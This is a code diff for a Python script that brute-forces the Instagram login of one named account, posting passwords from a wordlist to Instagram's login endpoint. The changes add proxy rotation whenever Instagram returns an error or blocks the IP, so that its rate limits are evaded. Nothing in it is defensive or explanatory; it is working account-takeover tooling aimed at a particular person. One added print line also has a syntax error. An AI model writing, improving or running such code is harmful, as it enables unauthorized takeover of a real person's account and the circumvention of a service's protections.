@@ -50,11 +50,12 @@ khas = 0;
 
 def startcount():
     global stcount;
-    if stcount < 10:
+    if stcount < 5:
         stcount = stcount +1
-    if stcount == 11:
+    if stcount == 5:
         stcount = 0;
-        
+        print(bcolors.OKGREEN"STCOUNT RESET")
+
 def changeproxy():
     global proxies;
     global khas;
@@ -140,8 +141,12 @@ def start_brute():
         password = line.strip()
         r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"hosnaa.83","password":password},headers=header,proxies=proxies)
         content = r.content;
+        if "Sorry, there was a problem with your request" in content:
+            print("changing proxy .... ")
+            changeproxy()
+            pass;
         if "checkpoint_required" in content:
-            print(bcolors.OKGREEN+'password found but need checkpoint | '+password)
+            print(bcolors.OKGREEN+'================ \r\n password found but need checkpoint '+password +'\r\n================')
             break;
         if ("Please wait a few minutes before you try again" in content):
             print(bcolors.FAIL + 'IP Blocked')
@@ -152,9 +157,9 @@ def start_brute():
         if "authenticated: true" not in content:
             if khas > 0:
                 startcount()
-                if stcount > 10:
-                    changeproxy()
-                    pass;
+            if stcount > 5:
+                changeproxy()
+                pass;
             print(bcolors.FAIL + "Incorrect |-| "+password)
             print(content)
         if "userId" in content:
